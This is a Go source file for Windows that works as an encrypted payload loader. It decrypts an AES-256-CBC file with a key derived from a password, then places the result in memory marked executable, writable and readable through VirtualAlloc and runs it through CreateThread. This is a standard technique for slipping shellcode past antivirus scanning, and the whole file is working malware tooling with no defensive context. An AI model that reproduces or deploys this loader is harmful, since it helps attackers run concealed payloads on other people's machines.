
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

// generateKey generates a 32-byte AES-256 key from a password.
func generateKey(password string) []byte {
	hash := sha256.Sum256([]byte(password))
	return hash[:]
}

// unpad removes PKCS#7 padding from decrypted data.
func unpad(data []byte) ([]byte, error) {
	length := len(data)
	if length == 0 {
		return nil, fmt.Errorf("decrypted data is empty")
	}
	padding := int(data[length-1])
	if padding > length || padding == 0 {
		return nil, fmt.Errorf("invalid padding size")
	}
	for _, p := range data[length-padding:] {
		if int(p) != padding {
			return nil, fmt.Errorf("invalid padding byte")
		}
	}
	return data[:length-padding], nil
}

// decryptData decrypts data using AES-256-CBC.
func decryptData(encryptedData, key, iv []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	if len(encryptedData)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("encrypted data is not a multiple of the block size")
	}

	decrypted := make([]byte, len(encryptedData))
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(decrypted, encryptedData)

	// Remove padding after decryption
	return unpad(decrypted)
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: loader <encrypted_binary> <password>")
		return
	}

	encryptedFile := os.Args[1]
	password := os.Args[2]

	// Read encrypted data from file
	encryptedData, err := os.ReadFile(encryptedFile)
	if err != nil {
		fmt.Println("Error reading encrypted file:", err)
		return
	}

	// Separate IV and encrypted content
	if len(encryptedData) < aes.BlockSize {
		fmt.Println("Invalid encrypted data length")
		return
	}
	iv := encryptedData[:aes.BlockSize]
	ciphertext := encryptedData[aes.BlockSize:]

	key := generateKey(password)
	decryptedData, err := decryptData(ciphertext, key, iv)
	if err != nil {
		fmt.Println("Decryption failed:", err)
		return
	}

	// Allocate executable memory using VirtualAlloc
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	ptr, _, err := virtualAlloc.Call(0, uintptr(len(decryptedData)), syscall.MEM_COMMIT|syscall.MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)
	if ptr == 0 {
		fmt.Println("VirtualAlloc failed:", err)
		return
	}

	// Copy decrypted binary to allocated memory
	dataSlice := (*[1 << 30]byte)(unsafe.Pointer(ptr))[:len(decryptedData):len(decryptedData)]
	copy(dataSlice, decryptedData)

	// Create a thread to execute the binary using CreateThread
	createThread := kernel32.NewProc("CreateThread")
	thread, _, err := createThread.Call(0, 0, ptr, 0, 0, 0)
	if thread == 0 {
		fmt.Println("CreateThread failed:", err)
		return
	}

	// Wait for the thread to finish using WaitForSingleObject
	waitForSingleObject := kernel32.NewProc("WaitForSingleObject")
	waitForSingleObject.Call(thread, syscall.INFINITE)
}
